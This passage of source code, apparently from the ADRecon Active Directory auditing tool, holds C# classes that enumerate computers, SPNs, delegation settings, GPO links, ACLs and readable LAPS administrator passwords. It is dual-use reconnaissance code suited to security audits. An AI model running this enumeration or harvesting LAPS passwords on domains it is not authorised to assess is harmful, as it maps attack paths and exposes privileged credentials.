                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = "";
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + "," + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    string OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", CleanString(AdComputer.Members["Description"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split('/');
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

$LDAPSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainController AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
